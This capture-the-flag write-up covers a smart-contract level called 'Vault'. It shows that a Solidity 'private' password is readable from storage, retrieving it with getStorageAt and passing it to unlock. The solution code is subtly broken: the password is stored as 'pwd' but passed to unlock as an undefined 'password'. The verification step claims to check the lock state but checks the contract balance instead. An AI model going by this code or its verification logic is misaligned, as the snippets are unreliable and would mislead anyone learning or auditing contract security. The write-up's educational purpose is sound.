# Level 8: Vault

## Challenge Overview

This challenge highlights how sensitive information can be exposed in smart contracts, even if not explicitly returned.  
The goal is to retrieve a hidden password stored in the `Vault` contract and unlock it.

## Goal

- Unlock the Vault by retrieving the stored password.

## Solution

### 1. Understanding the Vulnerability

The `Vault` contract stores a password in its storage:

```solidity
bytes32 private password;
bool public locked = true;

function unlock(bytes32 _password) public {
    if (_password == password) {
        locked = false;
    }
}
```

Although `password` is marked as `private`, it is still visible in the contract’s storage on the blockchain.

### 2. Read Storage Slots

Smart contract storage is public on the blockchain.  
Use the `eth_getStorageAt` RPC call to access the storage slot where the password is stored:

```javascript
const pwd = await web3.eth.getStorageAt(contract.address, 1);
```

### 3. Unlock the Vault

Use the retrieved password to call the `unlock` function:

```javascript
await contract.unlock(password);
```

### 4. Verify

Check the `locked` state:

```javascript
(await getBalance(contract.address)).toString() // should now be "0"
```

---

## Lessons Learned

- In Solidity, `private` variables are not hidden from the blockchain; they are only inaccessible through direct calls.
- Always assume that data stored on-chain can be accessed by anyone.
- Avoid storing sensitive information, like passwords, directly on-chain. Use hashing or cryptographic techniques instead.
